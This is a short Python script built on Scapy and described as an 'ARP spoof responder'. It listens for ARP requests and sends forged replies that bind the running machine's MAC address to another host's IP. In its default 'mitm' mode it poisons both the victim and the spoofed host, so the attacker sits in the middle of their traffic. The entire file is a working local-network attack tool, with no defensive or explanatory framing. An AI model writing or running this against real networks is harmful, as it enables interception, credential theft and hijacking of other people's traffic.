import argparse

from scapy.all import conf, get_if_hwaddr, sendp, sniff
from scapy.layers.l2 import ARP, Ether


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="ARP spoof responder")
    parser.add_argument("--iface", required=True)
    parser.add_argument("--victim-ip", required=True)
    parser.add_argument("--spoofed-ip", required=True)
    parser.add_argument("--mode", choices=("mitm", "reply_only"), default="mitm")
    return parser.parse_args()


def build_arp_reply(
    source_mac: str, source_ip: str, target_mac: str, target_ip: str
) -> Ether:
    return Ether(dst=target_mac, src=source_mac) / ARP(
        op=2,
        hwsrc=source_mac,
        psrc=source_ip,
        hwdst=target_mac,
        pdst=target_ip,
    )


def main() -> None:
    args = parse_args()
    conf.use_pcap = False
    hacker_mac = get_if_hwaddr(args.iface).lower()

    def handle_packet(packet) -> None:
        if ARP not in packet:
            return

        arp_packet = packet[ARP]
        if arp_packet.op != 1:
            return

        sender_mac = arp_packet.hwsrc.lower()
        sender_ip = arp_packet.psrc
        target_ip = arp_packet.pdst

        if sender_mac == hacker_mac:
            return

        if sender_ip == args.victim_ip and target_ip == args.spoofed_ip:
            sendp(
                build_arp_reply(
                    hacker_mac, args.spoofed_ip, sender_mac, args.victim_ip
                ),
                iface=args.iface,
                verbose=False,
            )
            return

        if (
            args.mode == "mitm"
            and sender_ip == args.spoofed_ip
            and target_ip == args.victim_ip
        ):
            sendp(
                build_arp_reply(
                    hacker_mac, args.victim_ip, sender_mac, args.spoofed_ip
                ),
                iface=args.iface,
                verbose=False,
            )

    sniff(iface=args.iface, filter="arp", store=False, prn=handle_packet)


if __name__ == "__main__":
    main()
